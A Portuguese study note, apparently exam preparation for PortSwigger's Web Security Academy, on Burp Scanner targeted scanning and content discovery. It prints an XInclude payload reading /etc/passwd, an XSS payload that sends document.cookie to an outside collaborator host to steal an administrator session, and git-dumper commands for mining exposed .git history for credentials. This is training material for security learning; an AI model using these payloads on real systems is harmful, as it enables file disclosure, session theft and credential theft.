# Enumeração

A PortSwigger ressalta que durante o exame nenhuma enumeração será necessária no sentido de ter que encontrar parâmetros, diretórios ou funcionalidades escondidas.

Essa seção trata-se mais de eventuais descobertas que você pode fazer e principalmente, de como usar o Scanner do Burp, algo dito como essencial para o exame.

<br>

## Laboratórios

**Targeted Scan**

Devido ao tempo limitado do exame, [escaneie pontos definidos](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing) e específicos das requests.

![spaces_oYjVVNuyBxUuweHQBVga_uploads_yeSnaFUG5zDiV234p2uw_image](https://github.com/user-attachments/assets/1baacc3e-eef4-4521-ba96-e96b366b6c4c)

<br>
<br>

**Lab: Discovering Vulnerabilities Quickly with Targeted Scanning**

Utilize o Active Scan em `POST /produck/stock`.

Isso vai identificar a injeção XML, então copie o comando e adapte para ler o arquivo `/etc/passwd`.
```
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

<br>
<br>

**Lab: Scanning Non-standard Data Structures**

Escaneie o cookie de sessão que apresenta um formato um pouco fora do comum para identificar a vulnerabilidade através do scanner.

Nesse caso, é um XSS que pode ser utilizado para roubar o cookie do administrator:
```
'"><svg/onload=fetch(`//OASTIFY.COM/${encodeURIComponent(document.cookie)}`)>:CURRENT-USER-LOGIN-COOKIE-2ND-PART
```

Lembre de encodar em URL:

![image](https://github.com/user-attachments/assets/89e61d23-325c-4126-afc6-189ebb522976)

<br>

## Content Discovery

Olhar os arquivos `robots.txt` e `sitemap.xml` pode revelar conteúdos.

Se encontrar o arquivo `.git` exposto, é possível baixar os commits antigos e ver se algum possui credenciais:
```
git-dumper https://0a3200d504033dce82e5f7a100de0017.web-security-academy.net/.git .

git log --stat
 
git show 8d7bd37bfe266c9d948e8bfea4e04ef8397a558d
```
